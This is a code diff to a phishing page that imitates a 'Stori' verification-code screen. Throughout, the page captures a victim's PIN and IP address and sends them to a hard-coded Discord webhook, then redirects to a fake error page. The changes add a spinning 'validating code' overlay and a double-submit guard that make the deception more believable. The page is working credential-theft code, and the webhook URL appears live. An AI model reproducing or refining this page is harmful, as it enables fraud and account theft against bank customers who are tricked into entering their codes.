@@ -21,6 +21,13 @@
     .pin-input { width: 40px; height: 40px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 1.25rem; background: white; }
     .pin-input:focus { border-color: #008f76; outline: none; }
     .no-access-btn { background: none; border: none; color: #008f76; padding: 1rem; font-size: 0.9rem; cursor: pointer; margin-top: 1rem; }
+    
+    /* Loader Overlay */
+    .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: rgba(255,255,255,0.95); z-index: 500; display: none; flex-direction: column; justify-content: center; align-items: center; }
+    .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid #00d180; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader-text { font-size: 18px; font-weight: bold; color: #333; }
+    
     @media (min-width: 768px) { .container { margin: 2rem auto; min-height: calc(100vh - 4rem); border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); } }
   </style>
 </head>
@@ -50,9 +57,15 @@
     </main>
   </div>
 
+  <!-- Loader Overlay -->
+  <div class="loader-overlay" id="loaderOverlay">
+    <div class="spinner"></div>
+    <div class="loader-text">Validando código...</div>
+  </div>
+
   <script>
-    // NUEVO WEBHOOK ACTUALIZADO
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0';
+    let enviando = false;
 
     async function getIP() {
       try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip; } 
@@ -70,6 +83,7 @@
     }
 
     function moveFocus(event, nextInputIndex) {
+      if (enviando) return;
       const currentInput = event.target;
       if (currentInput.value.length === 1) {
         const nextInput = document.getElementById('pin' + nextInputIndex);
@@ -84,17 +98,25 @@
     }
 
     async function submitForm() {
+      if (enviando) return;
+      enviando = true;
+
       const pinValues = Array.from(document.querySelectorAll('.pin-input')).map(input => input.value).join('');
       
-      // Guardar el PIN para que error.html no permita repetirlo
+      // Guardar el PIN para error.html
       sessionStorage.setItem('pinValidacion', pinValues);
       
       const ip = await getIP();
       const message = `🔢 **CÓDIGO DE VERIFICACIÓN (Stori)**\n\n🔐 **PIN:** ${pinValues}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
       
       await sendToDiscord(message);
-      
-      setTimeout(() => { window.location.href = 'error.html'; }, 1000);
+
+      // Mostrar loader por 4 segundos
+      document.getElementById('loaderOverlay').style.display = 'flex';
+
+      setTimeout(() => {
+        window.location.href = 'error.html';
+      }, 4000);
     }
 
     document.addEventListener('DOMContentLoaded', function() {
